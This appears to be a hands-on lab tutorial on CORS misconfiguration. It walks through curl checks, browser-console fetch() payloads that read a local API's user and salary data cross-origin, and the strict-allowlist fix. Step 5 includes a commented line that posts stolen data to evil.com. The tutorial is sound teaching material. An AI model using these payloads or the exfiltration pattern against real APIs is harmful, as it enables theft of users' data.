## CORS Misconfiguration

### What is it?
Cross-Origin Resource Sharing (CORS) controls which websites can make requests to your API and **read the response**. A wildcard (`*`) origin tells the browser: "any website is allowed to read my responses" — this lets a malicious site steal user data.

> **Key concept:** `curl` does NOT enforce CORS — only **browsers** do. That's why we need two servers to demonstrate this.

---

### Prerequisites

**Terminal 1** — Start the vulnerable API:
```Bash
uvicorn vulnerable:app --reload
```

**Terminal 2** — Start the attacker's website (on a different port/origin):
```Bash
python3 attacker_server.py
```

---

### Exploitation Steps

**1. Verify the API works (with curl)**

```Bash
curl http://127.0.0.1:8000/api/profile?token=token_admin
```

Expected Response:
```JSON
{"username":"admin","email":"admin@corp.com","salary":150000}
```

**2. Check the CORS headers**

Send a request with an `Origin` header to see what the server allows:

```Bash
curl -s -D - -H "Origin: http://localhost:9000" \
     http://127.0.0.1:8000/api/profile?token=token_admin \
     -o /dev/null | grep -i "access-control"
```

You will see:
```
access-control-allow-origin: *
access-control-allow-credentials: true
```

The `*` means **any website** can read the response. This is the vulnerability.

**3. Open the attacker's site and perform the exploit**

Open **http://localhost:9000** in your browser.

Open **DevTools** (press `F12` or `Cmd+Option+I` on Mac) and go to the **Console** tab.

Now **you** are the attacker. Paste this JavaScript in the console:

```javascript
fetch("http://localhost:8000/api/profile?token=token_admin")
  .then(r => r.json())
  .then(data => console.log("STOLEN DATA:", data))
  .catch(err => console.log("BLOCKED:", err.message))
```

You'll see the stolen data printed in the console:
```
STOLEN DATA: {username: "admin", email: "admin@corp.com", salary: 150000}
```

This worked because you're running this JavaScript **from localhost:9000** (the attacker's site), but the API on **localhost:8000** responded with `Access-Control-Allow-Origin: *`, so the browser allowed the cross-origin read.

**4. Steal all salaries**

Still in the console on http://localhost:9000, run:

```javascript
fetch("http://localhost:8000/api/internal/salaries?token=token_admin")
  .then(r => r.json())
  .then(data => console.log("STOLEN SALARIES:", data))
```

**5. Simulate sending the stolen data to the attacker's server**

In a real attack, the malicious page would silently send the data to the attacker:

```javascript
fetch("http://localhost:8000/api/profile?token=token_admin")
  .then(r => r.json())
  .then(stolen => {
    console.log("1. Data stolen from victim API:", stolen);
    console.log("2. Sending to attacker server: POST https://evil.com/collect", stolen);
    // In reality: fetch("https://evil.com/collect", {method:"POST", body: JSON.stringify(stolen)})
  })
```

---

### Test the Fix

Stop the vulnerable API (Ctrl+C in Terminal 1) and start the secure version:

```Bash
uvicorn solution:app --reload
```

Go back to the browser console on **http://localhost:9000** and repeat:

```javascript
fetch("http://localhost:8000/api/profile?token=token_admin")
  .then(r => r.json())
  .then(data => console.log("STOLEN:", data))
  .catch(err => console.log("BLOCKED:", err.message))
```

This time you'll see:
```
BLOCKED: Failed to fetch
```

The browser blocked the request because `solution.py` only allows specific trusted origins, not `*`.

---

**Result:** The wildcard CORS policy allows any website to read API responses cross-origin. The fix uses a strict domain allowlist so only your own frontend can access the API.
